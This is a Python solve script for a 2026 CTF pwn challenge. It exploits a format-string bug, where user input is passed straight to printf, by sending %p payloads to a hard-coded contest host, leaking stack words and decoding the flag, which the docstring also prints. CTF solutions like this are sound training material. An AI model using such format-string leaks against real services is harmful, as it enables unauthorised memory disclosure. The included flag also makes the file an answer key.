#!/usr/bin/env python3
"""
LIT CTF 2026 — pwn — "secrets"   (nc 136.115.87.65 31779)

"Ever wonder what happens behind the scenes of every C program?" -> printf.

The service reads a line and passes it STRAIGHT to printf:  printf(buf)
=> a classic format-string vulnerability. The flag (read from flag.txt) is held in
a stack buffer, so we just leak the stack with %p. Our input lands at arg offset 6;
the flag bytes live at offsets 14..18. Pack those qwords little-endian -> flag.

  LITCTF{PRINTF-vULN3r4b1LitY-ZftvINYopu}
"""
import socket, time, struct, re

HOST, PORT = "136.115.87.65", 31779

def leak(payload):
    s = socket.socket(); s.settimeout(6); s.connect((HOST, PORT))
    time.sleep(0.4); s.sendall(payload + b"\n"); time.sleep(0.9)
    out = b""
    while True:
        try:
            c = s.recv(4096)
            if not c: break
            out += c
        except socket.timeout:
            break
    s.close()
    return out.split(b"\nNothing")[0]

def main():
    # leak stack qwords 13..20, comma-delimited
    payload = b"".join(b"%%%d$p," % i for i in range(13, 21))
    line = leak(payload).decode("latin1")
    vals = [int(t, 16) if t.strip().startswith("0x") else 0
            for t in line.split(",") if t.strip()]
    blob = b"".join(struct.pack("<Q", v & (2**64 - 1)) for v in vals)
    flag = re.search(rb"LITCTF\{[^}]*\}", blob)
    print("[+]", flag.group().decode() if flag else blob)

if __name__ == "__main__":
    main()
